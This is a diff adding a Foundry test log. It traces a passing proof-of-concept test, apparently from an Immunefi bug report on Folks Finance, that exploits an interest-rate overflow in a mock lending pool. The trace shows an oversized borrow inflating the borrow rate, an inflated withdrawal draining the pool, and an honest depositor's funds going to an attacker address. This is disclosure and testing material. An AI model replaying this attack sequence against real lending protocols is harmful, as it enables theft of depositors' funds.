@@ -1,0 +1,135 @@
+Compiling 20 files with Solc 0.8.27
+Solc 0.8.27 finished in 2.70s
+Compiler run successful!
+
+Ran 1 test for test/61019-infinite-interest-rate-bug-immunefi-folks-finance-git_exp.sol:InfiniteInterestRateTest
+[PASS] test_exploit_infiniteInterestRate_drainsPool() (gas: 3412427)
+Traces:
+  [3472127] InfiniteInterestRateTest::test_exploit_infiniteInterestRate_drainsPool()
+    ├─ [1861772] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 9299 bytes of code
+    ├─ [1560244] Exploit::run()
+    │   ├─ [254026] → new MiniToken@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x466f6c6b7320506f6f6c20546f6b656e00000000000000000000000000000020
+    │   │   │   @ 1: 0 → 0x53544f4c454e2d544b4e00000000000000000000000000000000000000000014
+    │   │   └─ ← [Return] 1040 bytes of code
+    │   ├─ [860598] → new HubPool@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   ├─  storage changes:
+    │   │   │   @ 10: 0 → 0x000000000000000000000000000007d00003d090000f424000004e2000004e20
+    │   │   │   @ 14: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   │   @ 0: 0 → 0x000000000000000000000000000000000000000000000000000186a0000003e8
+    │   │   │   @ 12: 0 → 0x00000000000000000000000000000000000000000000000000f8b0a10e470000
+    │   │   │   @ 2: 0 → 7500
+    │   │   │   @ 5: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   @ 8: 0 → 0x000000000000000000000000000000000000000000000000003e2c284391c000
+    │   │   │   @ 6: 0 → 0x0000000000000000000000000000000000000000000f42400000c3500000445c
+    │   │   │   @ 9: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Return] 3228 bytes of code
+    │   ├─ [44680] MiniToken::mint(HubPool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 50000 [5e4])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x887583d56e5ebc1b6081f212e3300a82ad5d24c60ab663d07f0ba44aa75ea4ac: 0 → 50000
+    │   │   │   @ 2: 0 → 50000
+    │   │   └─ ← [Stop]
+    │   ├─ [46661] HubPool::creditDeposit(0x000000000000000000000000000000000000600d, 50000 [5e4])
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0 → 50000
+    │   │   │   @ 0x29458a19f033f5c10a17a94c2926b47746de3d9d4a8a092852bfd54497e18964: 0 → 50000
+    │   │   └─ ← [Stop]
+    │   ├─ [880] MiniToken::mint(HubPool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 50000 [5e4])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x887583d56e5ebc1b6081f212e3300a82ad5d24c60ab663d07f0ba44aa75ea4ac: 50000 → 100000
+    │   │   │   @ 2: 50000 → 100000
+    │   │   └─ ← [Stop]
+    │   ├─ [26761] HubPool::creditDeposit(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 50000 [5e4])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x81582de30395ab28a09528babbe0ac3bee6c185e0818a32b071d886a6be6c89b: 0 → 50000
+    │   │   │   @ 3: 50000 → 100000
+    │   │   └─ ← [Stop]
+    │   ├─ [45084] HubPool::updateWithBorrow(1000000000000000000 [1e18], false)
+    │   │   ├─  storage changes:
+    │   │   │   @ 8: 0x000000000000000000000000000000000000000000000000003e2c284391c000 → 0x00000000000000000000000000000000000001f8def8808ad992d7637c2ac000
+    │   │   │   @ 7: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   @ 4: 0 → 0x00000000000000000000000000102498ea6def76e10563ec3b5bd8d3cc000000
+    │   │   │   @ 12: 0x00000000000000000000000000000000000000000000000000f8b0a10e470000 → 0x00000000000000000000000000000000000001f8def8808ad9e2c704f79d0000
+    │   │   └─ ← [Stop]
+    │   ├─ [402] HubPool::getVariableBorrowInterestRate() [staticcall]
+    │   │   └─ ← [Return] 39999999999997067500000000000000 [3.999e31]
+    │   ├─ [23222] HubPool::accrueIndexes(1)
+    │   │   ├─  storage changes:
+    │   │   │   @ 9: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x000000000000000000000000000000000000000000010c97b47604d6f8261254
+    │   │   │   @ 5: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x0000000000000000000000000000000008968cd79a1cb834317bfed094c7082e
+    │   │   │   @ 1: 0 → 0x000000000000000000000000000000000000000000001adbf70eee36bb469b6e
+    │   │   └─ ← [Return]
+    │   ├─ [442] HubPool::fToken(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 50000 [5e4]
+    │   ├─ [599] HubPool::previewUnderlying(50000 [5e4]) [staticcall]
+    │   │   └─ ← [Return] 570776255707720712093378 [5.707e23]
+    │   ├─ [336] HubPool::totalDeposits() [staticcall]
+    │   │   └─ ← [Return] 100000 [1e5]
+    │   ├─ [442] HubPool::fToken(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 50000 [5e4]
+    │   ├─ [25790] HubPool::withdraw(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 50000 [5e4])
+    │   │   ├─ [486] MiniToken::balanceOf(HubPool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
+    │   │   │   └─ ← [Return] 100000 [1e5]
+    │   │   ├─ [22903] MiniToken::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 100000 [1e5])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x887583d56e5ebc1b6081f212e3300a82ad5d24c60ab663d07f0ba44aa75ea4ac: 100000 → 0
+    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 100000
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 100000 → 0
+    │   │   │   @ 0x81582de30395ab28a09528babbe0ac3bee6c185e0818a32b071d886a6be6c89b: 50000 → 0
+    │   │   └─ ← [Return] 100000 [1e5]
+    │   ├─ [486] MiniToken::balanceOf(HubPool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [22903] MiniToken::transfer(0x1111111111111111111111111111111111111111, 50000 [5e4])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 100000 → 50000
+    │   │   │   @ 0xfc40ea33816453f766ebc0872d4b5152b468882abe7b6b35528069db4d6e41c4: 0 → 50000
+    │   │   └─ ← [Return] true
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x00000000000000000000000000000000000001f8def8808ad992d7637c2ac000
+    │   │   @ 1: 0 → 0x0000000000000000000000000000000000000000000078ddd7c32ff64abe7ec2
+    │   │   @ 2: 0 → 100000
+    │   │   @ 6: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   @ 3: 0 → 50000
+    │   │   @ 5: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   └─ ← [Return]
+    ├─ [398] Exploit::underlyingAddr() [staticcall]
+    │   └─ ← [Return] MiniToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [304] Exploit::buggyVarRate() [staticcall]
+    │   └─ ← [Return] 39999999999997067500000000000000 [3.999e31]
+    ├─ [0] VM::assertGt(39999999999997067500000000000000 [3.999e31], 10000000000000000000000000000000 [1e31], "variable borrow rate did not explode") [staticcall]
+    │   └─ ← [Return]
+    ├─ [352] Exploit::attackerClaim() [staticcall]
+    │   └─ ← [Return] 570776255707720712093378 [5.707e23]
+    ├─ [253] Exploit::realAssetBase() [staticcall]
+    │   └─ ← [Return] 100000 [1e5]
+    ├─ [0] VM::assertGt(570776255707720712093378 [5.707e23], 100000 [1e5], "no over-mint of deposit value") [staticcall]
+    │   └─ ← [Return]
+    ├─ [352] Exploit::attackerClaim() [staticcall]
+    │   └─ ← [Return] 570776255707720712093378 [5.707e23]
+    ├─ [0] VM::assertGt(570776255707720712093378 [5.707e23], 100000000000000000000000 [1e23], "over-mint magnitude too small") [staticcall]
+    │   └─ ← [Return]
+    ├─ [253] Exploit::realAssetBase() [staticcall]
+    │   └─ ← [Return] 100000 [1e5]
+    ├─ [0] VM::assertEq(100000 [1e5], 100000 [1e5], "real asset base is only the 1e5 deposits") [staticcall]
+    │   └─ ← [Return]
+    ├─ [396] Exploit::honestRecoverable() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "pool not fully drained") [staticcall]
+    │   └─ ← [Return]
+    ├─ [413] Exploit::stolenToAttacker() [staticcall]
+    │   └─ ← [Return] 50000 [5e4]
+    ├─ [0] VM::assertEq(50000 [5e4], 50000 [5e4], "stolen amount != honest deposit") [staticcall]
+    │   └─ ← [Return]
+    ├─ [486] MiniToken::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   └─ ← [Return] 50000 [5e4]
+    ├─ [0] VM::assertEq(50000 [5e4], 50000 [5e4], "stolen underlying not at attacker EOA") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.56ms (1.28ms CPU time)
+
+Ran 1 test suite in 134.12ms (1.56ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
